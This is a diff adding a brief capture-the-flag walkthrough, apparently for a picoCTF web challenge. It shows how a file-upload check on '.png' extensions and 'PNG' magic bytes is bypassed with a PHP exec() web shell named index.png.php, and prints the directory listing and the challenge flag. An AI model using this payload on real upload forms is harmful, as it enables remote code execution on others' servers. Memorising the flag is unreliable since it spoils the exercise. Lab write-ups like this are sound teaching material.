@@ -1,0 +1,25 @@
+Go to robots.txt
+find /uploads/ and instructions.txt
+
+
+instructions.txt:
+Let's create a web app for PNG Images processing.
+It needs to:
+Allow users to upload PNG images
+	look for ".png" extension in the submitted files
+	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
+after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
+
+image uploads are stored in /uploads/ directory
+
+Construct file as payload
+PNG"
+<?php echo exec("cd /var/www/html/ && echo *");?>
+
+navigate to /uploads/index.png.php
+
+output:
+PNG" MFRDAZLDMUYDG.txt index.php instructions.txt robots.txt uploads
+
+http://atlas.picoctf.net:61498/MFRDAZLDMUYDG.txt
+/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_ab0ece03} */
